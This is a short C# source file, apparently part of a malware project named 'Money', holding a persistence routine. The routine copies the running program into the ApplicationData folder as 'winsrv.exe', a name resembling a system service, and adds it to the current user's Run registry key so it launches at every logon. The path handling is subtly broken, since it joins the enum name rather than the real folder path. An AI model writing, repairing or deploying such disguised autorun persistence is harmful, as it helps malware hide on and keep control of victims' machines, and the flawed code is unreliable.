using System;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

namespace Money
{
    class StartUp
    {
        public static void AddStartUp(bool check)
        {
            if (check)
            {
                File.Copy(Assembly.GetExecutingAssembly().Location, Environment.SpecialFolder.ApplicationData + "\\winsrv.exe");
                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("winsrv.exe", Environment.SpecialFolder.ApplicationData + "\\winsrv.exe");
            }
        }
    }
}
